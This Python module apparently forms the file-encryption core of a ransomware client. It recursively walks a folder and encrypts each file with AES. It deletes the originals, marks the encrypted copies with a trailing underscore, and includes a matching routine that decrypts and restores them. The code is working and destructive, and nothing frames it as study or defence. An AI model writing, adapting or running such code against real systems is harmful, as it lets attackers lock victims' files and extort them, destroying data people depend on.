import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from consts.client_consts import NONCE_SIZE


def aes_encryption_function(data: bytes, aes_key: bytes, mode: int) -> bytes:
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(aes_key, mode, nonce=nonce)
    encrypted_data = cipher.encrypt(data)
    return nonce + encrypted_data

def encrypt_all_files(folder_path: str, encryption_function, encryption_arguments) -> None:
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name) 
        if os.path.isfile(full_path) and not full_path.endswith("_"): 
            try:
                with open(full_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = encryption_function(file_data, *encryption_arguments)
                encrypted_path = full_path + "_"
                with open(encrypted_path, "wb") as f:
                    f.write(encrypted_data)
                os.remove(full_path) 
            except Exception as e:
                print(f"Error encrypting {full_path}: {e}")
                continue
        elif os.path.isdir(full_path):
            encrypt_all_files(full_path, encryption_function, encryption_arguments)



def aes_decryption_function(file_data: bytes, aes_key: bytes, mode: int) -> bytes:

    nonce = file_data[:NONCE_SIZE]
    ciphertext = file_data[NONCE_SIZE:]
    cipher = AES.new(aes_key, mode, nonce=nonce)
    
    return cipher.decrypt(ciphertext)

def decrypt_all_files(folder_path: str, decryption_function, decryption_arguments) -> None:
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name) 
        if os.path.isfile(full_path) and full_path.endswith("_"): 
            try:
                with open(full_path, "rb") as f:
                    file_data = f.read()
                
                decrypted_data = decryption_function(file_data, *decryption_arguments)
                
                original_path = full_path[:-1] 
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                
                os.remove(full_path) 
            except Exception as e:
                print(f"Error decrypting {full_path}: {e}")
                continue
        elif os.path.isdir(full_path):
            decrypt_all_files(full_path, decryption_function, decryption_arguments)